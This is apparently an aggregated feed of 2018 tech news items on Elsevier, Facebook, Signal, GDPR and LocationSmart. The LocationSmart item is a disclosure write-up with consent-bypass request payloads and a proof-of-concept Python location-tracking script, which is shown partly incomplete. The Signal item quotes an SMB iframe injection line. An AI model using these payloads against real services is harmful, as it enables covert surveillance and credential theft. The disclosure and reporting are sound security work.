&lt;p&gt;Sweden ends contract with science publisher Elsevier, moving for open access for scientific articles&lt;/p&gt;
&lt;/div&gt;&lt;div readability=&quot;56&quot;&gt;
&lt;p&gt;Elsevier, the publisher of top magazines &lt;em&gt;Cell&lt;/em&gt;, &lt;em&gt;The Lancet&lt;/em&gt; and many others, enjoys billions of dollars in yearly revenue at a high profit margin (37%).&lt;/p&gt;
&lt;p&gt;Sweden, like many other European countries, is aiming for full scientific &quot;open access&quot; (free article reading) by 2026. In 2017, Swedish universities paid Elsevier €1.3M ($1.5M) for article publications and €12M ($14.1M) for access to articles.&lt;/p&gt;
&lt;p&gt;Now Sweden is demanding that Elsevier make Swedish research content fully available to the public and make its 1,900 journals fully available to Swedish researchers, all at a reasonable price to Swedish universities.&lt;/p&gt;
&lt;p&gt;But the Swedes and Elsevier were unable to reach a deal. Starting June 30, Swedish researchers will no longer be publishing in Elsevier and will not have access to Elsevier magazines.&lt;/p&gt;
&lt;p&gt;Feuds between nations and science publishers are becoming quite common. Recently France declined to renew its deal with Springer and Germany battled Elsevier on fees.&lt;/p&gt;

<title>Facebook Use Has Been Dropping Since the 2016 Election, According to SimilarWeb</title>

<guid isPermaLink="true" >http://nwn.blogs.com/nwn/2018/05/facebook-use-dropped-sharply-after-the-us-election.html</guid>
<description>&lt;div readability=&quot;54.136363636364&quot;&gt;
&lt;p&gt;&lt;a class=&quot;asset-img-link&quot; href=&quot;http://nwn.blogs.com/.a/6a00d8341bf74053ef0223c84bdda4200c-popup&quot; onclick=&quot;window.open( this.href, '_blank', 'width=640,height=480,scrollbars=no,resizable=no,toolbar=no,directories=no,location=no,menubar=no,status=no,left=0,top=0' ); return false&quot;&gt;&lt;img alt=&quot;Facebook use 2016 election Cambridge Analytica&quot; class=&quot;asset asset-image at-xid-6a00d8341bf74053ef0223c84bdda4200c img-responsive&quot; src=&quot;http://nwn.blogs.com/.a/6a00d8341bf74053ef0223c84bdda4200c-500wi&quot; title=&quot;Facebook use 2016 election Cambridge Analytica&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Last week I noted that Facebook use &lt;a href=&quot;http://nwn.blogs.com/nwn/2018/05/facebook-similarweb-cambridge-analytica.html&quot;&gt;sharply dropped after the Cambridge Analytica scandal&lt;/a&gt;, according to &lt;a href=&quot;https://www.similarweb.com/website/nwn.blogs.com&quot;&gt;SimilarWeb&lt;/a&gt;, but as it turns out, the downward trend started even earlier -- specifically, right around the US Presidential election, in November 2016. (See above.) Since then, total monthly visits to Facebook in the US (both on the web and through the mobile app) have fallen from around 8 billion/month to what it is now, about 5 billion/month -- &lt;em&gt;a loss of some 3 billion visits&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;An analyst with SimilarWeb kindly shared the above data with me -- though for the record, he doesn't necessarily share my belief that the election itself is a causal factor: Rather, he believes there was just &lt;em&gt;more&lt;/em&gt; activity in the run-up to the election (users sharing and arguing over the latest campaign news, and so on) which dropped off after the votes were counted and Trump was announced as winner; and also, on mobile, more Facebook users are using alternate social media apps like Instagram and WhatsApp more. (You can see that mobile usage is what's been declining since November 2016, while desktop usage has remained roughly steady from month to month.)&lt;/p&gt;
&lt;p&gt;That's certainly possible (and definitely part of the downward trend), but I have another interpretation:&lt;/p&gt;
&lt;/div&gt;&lt;div readability=&quot;41&quot;&gt;
&lt;p&gt;Desktop users tend to skew older and are generally associated with daily usage routines (i.e. logging into Facebook from work on the office computer), so it makes sense that desktop Facebook usage would remain steady. Meanwhile, the majority of Facebook usage has been via mobile for years, so it makes sense that this is where usage would take the main hit. In the end, only Facebook itself will know just how much #DeleteFacebook and general user anger at the social network in relation to the election has caused this ongoing drop. What is certain, however, is that the drop is happening.&lt;/p&gt;

<title>Another flaw in Signal desktop app leaks chats in plaintext</title>

<guid isPermaLink="true" >https://thehackernews.com/2018/05/signal-desktop-hacking.html</guid>
<description>
&lt;div class=&quot;separator&quot;&gt;
&lt;a href=&quot;https://1.bp.blogspot.com/-16V2b7k40K0/WvsvtoWsTWI/AAAAAAAAwuY/hzeelaoW_lgXw3fXNJiRZ4MZ4l6VdRA_wCLcBGAs/s728-e7/signal-hacking-exploit.png&quot; imageanchor=&quot;1&quot;&gt;&lt;img alt=&quot;signal-hacking-exploit&quot; border=&quot;0&quot; data-original-height=&quot;380&quot; data-original-width=&quot;728&quot; src=&quot;https://1.bp.blogspot.com/-16V2b7k40K0/WvsvtoWsTWI/AAAAAAAAwuY/hzeelaoW_lgXw3fXNJiRZ4MZ4l6VdRA_wCLcBGAs/s728-e7/signal-hacking-exploit.png&quot; title=&quot;signal-hacking-exploit&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
For the second time in less than a week, users of the popular end-to-end encrypted Signal messaging app have to update their desktop applications once again to patch another severe code injection vulnerability.&lt;p&gt;Discovered &lt;a href=&quot;https://ivan.barreraoro.com.ar/signal-desktop-html-tag-injection-variant-2/&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot;&gt;Monday&lt;/a&gt; by the same team of security researchers, the newly discovered vulnerability poses the same threat as the previous one, allowing remote attackers to inject malicious code on the recipients' Signal desktop app just by sending them a message—without requiring any user interaction.&lt;br/&gt;&lt;/p&gt;&lt;div class=&quot;clear&quot; id=&quot;load-rest&quot;&gt;&lt;ins class=&quot;adsbygoogle&quot; data-ad-client=&quot;ca-pub-7983783048239650&quot; data-ad-format=&quot;link&quot; data-ad-slot=&quot;3375644985&quot;/&gt; &lt;/div&gt;&lt;br/&gt;To understand more about the first &lt;a href=&quot;https://thehackernews.com/2018/05/signal-messenger-code-injection.html&quot; target=&quot;_blank&quot;&gt;code injection vulnerability&lt;/a&gt; (&lt;a href=&quot;https://thehackernews.com/2018/05/signal-messenger-code-injection.html&quot; target=&quot;_blank&quot;&gt;&lt;span id=&quot;goog_505593759&quot;/&gt;CVE-2018-10994&lt;span id=&quot;goog_505593760&quot;/&gt;&lt;/a&gt;), you can read our previous article covering how researchers find the Signal flaw and how it works.&lt;p&gt;The only difference between the two is that the previous flaw resides in the function that handles links shared in the chat, whereas the new vulnerability (CVE-2018-11101) exists in a different function that handles the validation of quoted messages, i.e., quoting a previous message in a reply.&lt;br/&gt;&lt;/p&gt;&lt;div class=&quot;separator&quot;&gt;
&lt;a href=&quot;https://1.bp.blogspot.com/-gBEt6z-Zpqg/Wvsl7tDn2MI/AAAAAAAAwuA/pnoE3t5T0LYpXfTX0pxAdDzs1vgSyAcPwCLcBGAs/s728-e7/signal-code-execution-flaw.png&quot; imageanchor=&quot;1&quot;&gt;&lt;img alt=&quot;signal-code-execution-flaw&quot; border=&quot;0&quot; data-original-height=&quot;380&quot; data-original-width=&quot;728&quot; src=&quot;https://1.bp.blogspot.com/-gBEt6z-Zpqg/Wvsl7tDn2MI/AAAAAAAAwuA/pnoE3t5T0LYpXfTX0pxAdDzs1vgSyAcPwCLcBGAs/s728-e7/signal-code-execution-flaw.png&quot; title=&quot;signal-code-execution-flaw&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
In other words, to exploit the newly patched bug on vulnerable versions of Signal desktop app, all an attacker needs to do is send a malicious HTML/javascript code as a message to the victim, and then quote/reply to that same message with any random text.&lt;p&gt;If the victim receives this quoted message containing the malicious payload on its vulnerable Signal desktop app, it will automatically execute the payload, without requiring any user interaction.&lt;/p&gt;&lt;h3&gt;
Exploiting Signal Code Injection to Steal Plaintext Chats&lt;/h3&gt;
&lt;div class=&quot;video-container&quot;&gt;
&lt;iframe allow=&quot;autoplay; encrypted-media&quot; allowfullscreen=&quot;&quot; frameborder=&quot;0&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/JEoDEg0b_v0?rel=0&amp;amp;showinfo=0&quot; width=&quot;560&quot;&gt;[embedded content]&lt;/iframe&gt;&lt;/div&gt;
&lt;br/&gt;Until now the proof-of-concept payloads used to demonstrate code injection vulnerabilities in Signal were limited to embedding an HTML iFrame, or image/video/audio tags onto the victim's desktop app.&lt;p&gt;However, researchers have now managed to craft a &lt;a href=&quot;https://bit.ly/signal-exploit-poc&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot;&gt;new PoC exploit&lt;/a&gt; that could allow remote attackers to successfully steal all Signal conversations of the victims in the plaintext just by sending them a message.&lt;br/&gt;&lt;/p&gt;&lt;div class=&quot;second-place clear&quot; id=&quot;second-place&quot;&gt; &lt;ins class=&quot;adsbygoogle&quot; data-ad-client=&quot;ca-pub-7983783048239650&quot; data-ad-format=&quot;auto&quot; data-ad-slot=&quot;8662821141&quot;/&gt; &lt;/div&gt;&lt;br/&gt;This hack literally defeats the purpose of an end-to-end encrypted messaging app, allowing remote attackers to easily get the hold on users' plain-text conversations without breaking the encryption.&lt;h3&gt;
Attackers Could Possibly Steal Windows Password As Well&lt;/h3&gt;
&lt;br/&gt;What's worse?&lt;p&gt;In their blog post, the researchers also indicated that an attacker could even include files from a remote SMB share using an HTML iFrame, which can be abused to steal NTLMv2 hashed password for Windows users.&lt;br/&gt;&lt;/p&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;
&quot;In the Windows operative system, the CSP fails to prevent remote inclusion of resources via the SMB protocol. In this case, remote execution of JavaScript can be achieved by referencing the script in an SMB share as the source of an iframe tag, for example: &lt;b&gt;&amp;lt;iframe src=\\DESKTOP-XXXXX\Temp\test.html&amp;gt; &lt;/b&gt;and then replying to it,&quot; the researchers explain.&lt;/blockquote&gt;
Though they haven't claimed anything about this form of attack, I speculate that if an attacker can exploit code injection to force Windows OS to initiate an automatic authentication with the attacker-controlled SMB server using single sign-on, it would eventually hand over victim's username, and NTLMv2 hashed password to the attackers, potentially allowing them to gain access to the victim's system.&lt;p&gt;We have seen how the same attack technique was recently exploited using a &lt;a href=&quot;https://thehackernews.com/2018/04/outlook-smb-vulnerability.html&quot; target=&quot;_blank&quot;&gt;vulnerability in Microsoft Outlook&lt;/a&gt;, disclosed last month.&lt;/p&gt;&lt;p&gt;I can not verify this claim at this moment, but we are in contact with few security researchers to confirm this.&lt;/p&gt;&lt;p&gt;Researchers—Iván Ariel Barrera Oro, Alfredo Ortega, Juliano Rizzo, and Matt Bryant—responsibly reported the vulnerability to Signal, and its developers have patched the vulnerability with the release of &lt;a href=&quot;https://signal.org/download/&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot;&gt;Signal desktop&lt;/a&gt; version 1.11.0 for Windows, macOS, and Linux users.&lt;/p&gt;&lt;p&gt;However, The Hacker News has learned that Signal developers had already identified this issue as part of a comprehensive fix to the first vulnerability before the researchers found it and reported them.&lt;/p&gt;&lt;p&gt;Signal app has an auto-update mechanism, so most users must have the update already installed. You can &lt;a href=&quot;https://support.signal.org/hc/en-us/articles/360003906531-How-do-I-ensure-Signal-Desktop-is-up-to-date-&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot;&gt;read this guide&lt;/a&gt; to ensure if you are running updated version of Signal.&lt;/p&gt;&lt;p&gt;And if you don’t, you should immediately update your Signal for desktop as soon as possible, since now the vulnerability poses a severe risk of getting your secret conversations exposed in plaintext to attackers and further severe consequences.&lt;/p&gt;</description>

<title>GDPR: Removing Monal from the EU</title>
<link>https://monal.im/blog/gdpr-removing-monal-from-the-eu/</link>
<guid isPermaLink="true" >https://monal.im/blog/gdpr-removing-monal-from-the-eu/</guid>
<description>&lt;p&gt;As many people know the EU’s GDPR regulations come into effect on May 25th. While Monal is privacy focused, it is also free, open source and run by a single person — me.  I simply do not have the resources or the time to jump through the regulatory hoops required by the EU.  While I do not live in the EU, I frequent Europe and do not want to get into legal trouble on vacation.  As GDPR approaches, I get the impression that it is an end of an era for the internet. The days of someone making something, putting it on the internet and offering it to the world seem to be over.  EU users can always download the source on GitHub and compile the iOS app but they will be blocked from using push when I deploy it.&lt;/p&gt;
&lt;p&gt;The problems below are likely not unique to me and there are &lt;a href=&quot;https://opensource.com/article/18/4/gdpr-impact&quot;&gt;many other issues.&lt;/a&gt; Other open source projects may want to consider their fate under GDPR as well.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Data Protection Officer&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;I do not have the resources to hire a &lt;a href=&quot;https://gdpr-info.eu/art-39-gdpr/&quot;&gt;Data Protection Officer&lt;/a&gt; (DPO) or EU Representative as required by GDPR.  I do not have designated EU contacts.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Crashes&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Tracking crashes with Crashlytics introduces new issues because it is posted to Fabric from a user’s device,  IP addresses are in the logs this is  personally identifiable information  (PII).  Crashlytics  is &lt;a href=&quot;https://docs.fabric.io/apple/fabric/data-privacy.html?utm_source=blog&amp;amp;utm_medium=blog&amp;amp;utm_campaign=fabric_gdpr#fabric-will-be-gdpr-ready&quot;&gt;GDPR compliant&lt;/a&gt; but the burden is on me to show  regulators that I am compliant points back to the need for DPO.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Push&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Even though no message traffic passes through Monal’s sever, registering for a push does make an HTTP call which logs a user’s IP and this  requires GDPR compliance.  APNS push tokens are associated with devices which can be traced back to a user if combined with info on the originating XMPP server. Obviously, this is needed for a notification to be delivered to the right person. However,the fact that it can be combined to identify a person makes it PII. I believe in privacy but I do not have the resources to meet the letter of the law for compliance especially with respect to retention and processing these tokens.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;XMPP Federation in General&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Honestly, I do not know if XMPP federation is legal anymore in the EU with GDPR.  EU user data is sent out of Europe constantly.  GDPR is written such that a user cannot agree to a user agreement that gives up GDPR requirements it’s not a matter of saying you agree to X by using this service. GDPR compliance is something the XSF is talking about &lt;a href=&quot;https://wiki.xmpp.org/web/GDPR&quot;&gt;right now&lt;/a&gt;.&lt;/p&gt;

<title>LocationSmart Leaked Location Data for All Major U.S. Carriers in Real Time</title>
<link>https://www.robertxiao.ca/hacking/locationsmart/</link>
<guid isPermaLink="true" >https://www.robertxiao.ca/hacking/locationsmart/</guid>
<description>&lt;p&gt;On May 16th, I found a vulnerability in the LocationSmart website which allowed anyone, with no prior authentication or consent, to obtain the realtime location of any cellphone in the US to within a few hundred feet. I immediately moved to contact US CERT to coordinate disclosure, and worked with Brian Krebs to &lt;a href=&quot;https://krebsonsecurity.com/2018/05/tracking-firm-locationsmart-leaked-location-data-for-customers-of-all-major-u-s-mobile-carriers-in-real-time-via-its-web-site/&quot;&gt;publish the story&lt;/a&gt; after the vulnerability was fixed this morning (May 17th).&lt;/p&gt;
&lt;p&gt;Now that I have verified that the vulnerability is fixed, I am releasing the relevant technical details of the bug and exploit.&lt;/p&gt;
&lt;h3&gt;Introduction&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://www.locationsmart.com/&quot;&gt;LocationSmart&lt;/a&gt; is a cellphone location tracking service which was recently in the news (e.g. &lt;a href=&quot;https://www.zdnet.com/article/us-cell-carriers-selling-access-to-real-time-location-data/&quot;&gt;[1]&lt;/a&gt;, &lt;a href=&quot;https://arstechnica.com/tech-policy/2018/05/senator-furious-at-polices-easy-ability-to-get-real-time-mobile-location-data/&quot;&gt;[2]&lt;/a&gt;) for selling location data to third party Securus, who then improperly disclosed it to a former law enforcement official. LocationSmart partners with various telecom companies to obtain the real-time location of mobile customers via cell-tower triangulation (same approach as E911 localization), counting among its partners Verizon &lt;a href=&quot;https://archive.li/tCLrd&quot;&gt;[3]&lt;/a&gt;, AT&amp;amp;T, T-Mobile, Sprint, and Canadian carriers Bell, Rogers and Telus. LocationSmart then sells the location data to other companies, for purposes including geolocated assistance and marketing. Note that because this is carrier-based, it works regardless of phone operating system or the privacy settings on the device itself. There is no ability to opt-out.&lt;/p&gt;
&lt;h3&gt;Background&lt;/h3&gt;
&lt;p&gt;LocationSmart provided a trial webpage, located at &lt;a href=&quot;https://www.locationsmart.com/try/&quot;&gt;https://www.locationsmart.com/try/&lt;/a&gt;, where anyone can enter a cellphone number, reply to a consent request (delivered via either SMS or phone call to the target number), and see the real-time location of that number. The intention is that the phone call or text-message reply is necessary for a user to “opt-in” to the location tracking demonstration.&lt;/p&gt;
&lt;p&gt;After selecting to track “My Mobile”, the page makes a POST request to &lt;a href=&quot;https://www.locationsmart.com/try/api/&quot;&gt;https://www.locationsmart.com/try/api/&lt;/a&gt; with the following payload (with 8005551212 replacing the real phone number):&lt;/p&gt;
&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;
requestdata={&quot;deviceType&quot;:&quot;Wireless&quot;,&quot;deviceID&quot;:&quot;8005551212&quot;,&quot;devicedetails&quot;:&quot;true&quot;,&quot;carrierReq&quot;:&quot;true&quot;}&amp;amp;requesttype=statusreq.json
&lt;/pre&gt;

&lt;/pre&gt;
&lt;p&gt;(Some fields have been anonymized). The TOKEN is a 12-byte value, which decodes using a modified version of Base64 to a nanosecond-precision timestamp.&lt;/p&gt;
&lt;p&gt;The webpage then repeatedly POSTs to the same endpoint with the following payload:&lt;/p&gt;
&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;
requestdata={&quot;subscriptionAction&quot;:&quot;status&quot;,&quot;tn&quot;:&quot;8005551212&quot;,&quot;carrierReq&quot;:&quot;true&quot;}&amp;amp;requesttype=subscriptionreq
&lt;/pre&gt;
&lt;p&gt;and receives an XML payload formatted like&lt;/p&gt;
&lt;pre class=&quot;brush: xml; title: ; notranslate&quot; title=&quot;&quot;&gt;
&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;SubscriptionResp&amp;gt;
  &amp;lt;uid&amp;gt;REDACTED&amp;lt;/uid&amp;gt;
  &amp;lt;requestTime&amp;gt;2018-05-17T00:43:44.631+00:00&amp;lt;/requestTime&amp;gt;
  &amp;lt;statusCode&amp;gt;0&amp;lt;/statusCode&amp;gt;
  &amp;lt;statusMsg&amp;gt;Success&amp;lt;/statusMsg&amp;gt;
  &amp;lt;tn&amp;gt;8005551212&amp;lt;/tn&amp;gt;
  &amp;lt;subscriptionGroup&amp;gt;LOCA-D01-LOCNOPIN&amp;lt;/subscriptionGroup&amp;gt;
  &amp;lt;subscriptionOptInState&amp;gt;requested&amp;lt;/subscriptionOptInState&amp;gt;
  &amp;lt;contact&amp;gt;sms&amp;lt;/contact&amp;gt;
&amp;lt;/SubscriptionResp&amp;gt;
&lt;/pre&gt;
&lt;p&gt;It waits for the response &lt;code&gt;subscriptionOptInState&lt;/code&gt; to change to &lt;code&gt;approved&lt;/code&gt;, then makes a final POST request to the same endpoint with the following payload:&lt;/p&gt;
&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;
requestdata={&quot;civicAddressReq&quot;:&quot;True&quot;,&quot;geoAddressReq&quot;:&quot;True&quot;,&quot;extAddressReq&quot;:&quot;True&quot;,&quot;nearbyPoiReq&quot;:&quot;True&quot;,&quot;privacyConsent&quot;:&quot;True&quot;,&quot;token&quot;:&quot;TOKEN&quot;,&quot;locationtype&quot;:&quot;network&quot;,&quot;accuracyReq&quot;:&quot;Coarse&quot;,&quot;tnDetailReq&quot;:&quot;False&quot;,&quot;carrierReq&quot;:&quot;true&quot;}&amp;amp;requesttype=locreq
&lt;/pre&gt;
&lt;p&gt;This replies with an XML payload containing the target device’s location. Note that the &lt;code&gt;token&lt;/code&gt; is the only identifier that varies in this request, and it is the same as the token obtained from the &lt;code&gt;statusreq&lt;/code&gt; request.&lt;/p&gt;
&lt;p&gt;If you make a similar POST request to a phone that has not consented to location tracking, you get a payload like&lt;/p&gt;
&lt;pre class=&quot;brush: xml; title: ; notranslate&quot; title=&quot;&quot;&gt;
&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;LocResp&amp;gt;
  &amp;lt;uid&amp;gt;REDACTED&amp;lt;/uid&amp;gt;
  &amp;lt;requestTime&amp;gt;2018-05-17T00:03:46.073+00:00&amp;lt;/requestTime&amp;gt;
  &amp;lt;statusCode&amp;gt;42&amp;lt;/statusCode&amp;gt;
  &amp;lt;statusMsg&amp;gt;SubscriptionNotActive&amp;lt;/statusMsg&amp;gt;
  &amp;lt;carrier&amp;gt;T-Mobile&amp;lt;/carrier&amp;gt;
  &amp;lt;deviceId&amp;gt;8005551212&amp;lt;/deviceId&amp;gt;
  &amp;lt;tn&amp;gt;8005551212&amp;lt;/tn&amp;gt;
&amp;lt;/LocResp&amp;gt;
&lt;/pre&gt;
&lt;h3&gt;Vulnerability&lt;/h3&gt;
&lt;p&gt;If you make the &lt;em&gt;same&lt;/em&gt; request with &lt;code&gt;requesttype=locreq.json&lt;/code&gt;, you get the full location data, &lt;strong&gt;without&lt;/strong&gt; receiving consent. This is the heart of the bug. Essentially, this requests the location data in JSON format, instead of the default XML format. For some reason, this also suppresses the consent (“subscription”) check.&lt;/p&gt;
&lt;p&gt;In essence, you can do the following:&lt;/p&gt;
&lt;ol readability=&quot;7.5&quot;&gt;&lt;li readability=&quot;3&quot;&gt;POST with
&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;
requestdata={&quot;deviceType&quot;:&quot;Wireless&quot;,&quot;deviceID&quot;:&quot;NUMBER&quot;,&quot;devicedetails&quot;:&quot;true&quot;,&quot;carrierReq&quot;:&quot;true&quot;}&amp;amp;requesttype=statusreq.json
&lt;/pre&gt;
&lt;p&gt;to get a token&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;12&quot;&gt;POST with
&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;
requestdata={&quot;civicAddressReq&quot;:&quot;True&quot;,&quot;geoAddressReq&quot;:&quot;True&quot;,&quot;extAddressReq&quot;:&quot;True&quot;,&quot;nearbyPoiReq&quot;:&quot;True&quot;,&quot;privacyConsent&quot;:&quot;True&quot;,&quot;token&quot;:&quot;TOKEN&quot;,&quot;locationtype&quot;:&quot;network&quot;,&quot;accuracyReq&quot;:&quot;Coarse&quot;,&quot;tnDetailReq&quot;:&quot;False&quot;,&quot;carrierReq&quot;:&quot;true&quot;}&amp;amp;requesttype=locreq.json
&lt;/pre&gt;
&lt;p&gt;and wait a few seconds to get a location&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;That’s all. The entire consent process is bypassed and you have the phone’s location. Here is the proof-of-concept Python script I built to demonstrate the issue:&lt;/p&gt;
&lt;pre class=&quot;brush: python; title: ; notranslate&quot; title=&quot;&quot;&gt;
#!/usr/bin/env python3

import requests
import json
import sys
import webbrowser

if len(sys.argv) &amp;gt;= 2:
    phone = sys.argv[1]
else:
    phone = input(&quot;Phone number? &quot;)

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:60.0) Gecko/20100101 Firefox/60.0',
    'DNT': '1'
}

r1 = requests.post('https://www.locationsmart.com/try/api/',
    headers=headers,
    data={
        'requestdata': json.dumps({&quot;deviceType&quot;:&quot;Wireless&quot;,&quot;deviceID&quot;:phone,&quot;devicedetails&quot;:&quot;true&quot;,&quot;carrierReq&quot;:&quot;true&quot;}),
        'requesttype': 'statusreq.json'
    }
)

data = r1.json()

r2 = requests.post('https://www.locationsmart.com/try/api/',
    headers=headers,
    data={

        'requesttype': 'locreq.json'
    }
)

data2 = r2.json()

if 'civicAddress' in data2:
    print('{phone}: near {streetAddress}, {city}, {state} {zip}'.format(phone=phone, **data2['civicAddress']))

if 'geoAddress' in data2:
    url = 'http://localhost:8000/location.html?lat={coordinates[1]}&amp;amp;lng={coordinates[0]}&amp;amp;acc={accuracy}'.format(**data2['geoAddress'])
    webbrowser.open_new_tab(url)
&lt;/pre&gt;
&lt;p&gt;This pops up a simple HTML page that draws a circle of radius &lt;code&gt;acc&lt;/code&gt; at coordinates &lt;code&gt;lat, lng&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;sharedaddy sd-sharing-enabled&quot;&gt;

&lt;/div&gt;

<title>Tiny Trains: Neat Narrow-Gauge Rail Connects German Island to Mainland</title>

<guid isPermaLink="true" >https://weburbanist.com/2018/05/08/tiny-trains-neat-narrow-gauge-rail-connects-german-island-to-mainland/</guid>
<description>&lt;p&gt;&lt;a href=&quot;https://weburbanist.com/2018/05/08/tiny-trains-neat-narrow-gauge-rail-connects-german-island-to-mainland/#&quot; data-featherlight=&quot;https://weburbanist.com/wp-content/uploads/2018/04/tinytrains.gif&quot;&gt;&lt;img class=&quot;first-image img-responsive&quot; src=&quot;https://weburbanist.com/wp-content/uploads/2018/04/tinytrains.gif&quot; alt=&quot;&quot; width=&quot;644&quot; height=&quot;319&quot;/&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The island of Nordstrandischmoor is connected to mainland Germany by a tiny narrow gauge railway, on which residents (at least those 15 years of age and older and holding a moped license) can drive private trains back and forth to and from Lüttmoorsiel. Each island house has its own wagon — some used to be wind-powered, using sails, but today they run on diesel.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://weburbanist.com/2018/05/08/tiny-trains-neat-narrow-gauge-rail-connects-german-island-to-mainland/#&quot; data-featherlight=&quot;https://weburbanist.com/wp-content/uploads/2018/04/mini-train-960x720.jpg&quot;&gt;&lt;img class=&quot;alignnone size-wide644 wp-image-112870&quot; src=&quot;https://weburbanist.com/wp-content/uploads/2018/04/mini-train-644x483.jpg&quot; alt=&quot;&quot; width=&quot;644&quot; height=&quot;483&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Often called simply the Lorenbahn, this slim rail line reaches out over a third of a mile to bridge the island to the shore, and is sometimes closed due to extreme winds or other weather-related risks. On either shore, the line branches out to a series of local destinations. some of the trains are enclosed, but others are open-air, like conventional convertible cars but on rails.&lt;/p&gt;
&lt;div class=&quot;video-box&quot;&gt;&lt;iframe type=&quot;text/html&quot; src=&quot;https://www.youtube.com/embed/DULlPrOOtuc?rel=0&quot; frameborder=&quot;0&quot; webkitallowfullscreen=&quot;&quot; mozallowfullscreen=&quot;&quot; allowfullscreen=&quot;&quot;&gt;[embedded content]&lt;/iframe&gt;&lt;/div&gt;
&lt;p&gt;The original line was constructed to ferry out building materials for coastal defense, then destroyed by ice flows, only to be rebuilt in a more durable fashion.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://weburbanist.com/2018/05/08/tiny-trains-neat-narrow-gauge-rail-connects-german-island-to-mainland/#&quot; data-featherlight=&quot;https://weburbanist.com/wp-content/uploads/2018/04/island-station-960x1280.jpg&quot;&gt;&lt;img class=&quot;alignnone size-wide644 wp-image-112871&quot; src=&quot;https://weburbanist.com/wp-content/uploads/2018/04/island-station-644x859.jpg&quot; alt=&quot;&quot; width=&quot;644&quot; height=&quot;859&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Some of the rail vehicles belong to the State Department for Coastal Defence and National Parks. There are two locomotives and two construction wagons (Bauwagen, which provide shelter for the workers during construction work, as well as goods wagons for construction work.&lt;/p&gt;
&lt;div class=&quot;video-box&quot;&gt;&lt;iframe type=&quot;text/html&quot; src=&quot;https://www.youtube.com/embed/Qld0d_YBoro?rel=0&quot; frameborder=&quot;0&quot; webkitallowfullscreen=&quot;&quot; mozallowfullscreen=&quot;&quot; allowfullscreen=&quot;&quot;&gt;[embedded content]&lt;/iframe&gt;&lt;/div&gt;
&lt;p&gt;Other narrow-gauge trains can be found around the world as well, often serving similarly small communities or other niche design functions.&lt;/p&gt;
&lt;div class=&quot;video-box&quot;&gt;&lt;iframe type=&quot;text/html&quot; src=&quot;https://www.youtube.com/embed/oDvHzyhferg?rel=0&quot; frameborder=&quot;0&quot; webkitallowfullscreen=&quot;&quot; mozallowfullscreen=&quot;&quot; allowfullscreen=&quot;&quot;&gt;[embedded content]&lt;/iframe&gt;&lt;/div&gt;

<title>Book recommendation: Measure what matters</title>
<link>https://www.gatesnotes.com/Books/Measure-What-Matters?WT.mc_id=20180516172000_MeasureWhatMatters_BG-LI&amp;WT.tsrc=BGLI&amp;linkId=51788990</link>

<description>&lt;div id=&quot;content_0_articlePanel&quot; readability=&quot;175.92081065866&quot;&gt;
&lt;p&gt;In the early days of Microsoft, I felt pretty confident about my coding skills, but I had a lot to learn about project management. This became abundantly clear after an incident in 1978, when I told Intel—a really important customer—that we would deliver them a version of Microsoft BASIC in four weeks. They thought I was crazy to promise it that fast, and it turned out that they were right. We were two weeks late.&lt;/p&gt;
&lt;p&gt;As it happens, Intel employed someone who would end up helping me improve my management skills: Andy Grove. A precise, hard-driving guy, Andy oversaw their strategy and operations, and he championed the idea of management by objective. Andy and I became friendly over the years, I studied several of the business books he wrote early on, and Microsoft adopted some of the methods that Intel used. I consider Andy one of the great business leaders of the 20&lt;sup&gt;th&lt;/sup&gt; century.&lt;/p&gt;
&lt;p&gt;Andy’s ideas are a basis for the management system called OKRs (Objectives and Key Results) developed by John Doerr, a venture capitalist and a frequent business partner of mine. In his new book, &lt;a href=&quot;https://www.penguinrandomhouse.com/books/546304/measure-what-matters-by-john-doerr-foreword-by-larry-page/9780525536222/&quot; target=&quot;_blank&quot;&gt;&lt;em&gt;Measure What Matters: How Google, Bono, and the Gates Foundation Rock the World With OKRs&lt;/em&gt;&lt;/a&gt;, John explains how OKRs work and shows how you can apply them in all sorts of situations.&lt;/p&gt;
&lt;p&gt;I’d recommend John’s book for anyone interested in becoming a better manager (and I’d say that even if I hadn’t been interviewed for a super-nice chapter about the Gates Foundation). In the excerpt below, John tells the inside story of how Andy inspired the idea of OKRs.&lt;/p&gt;
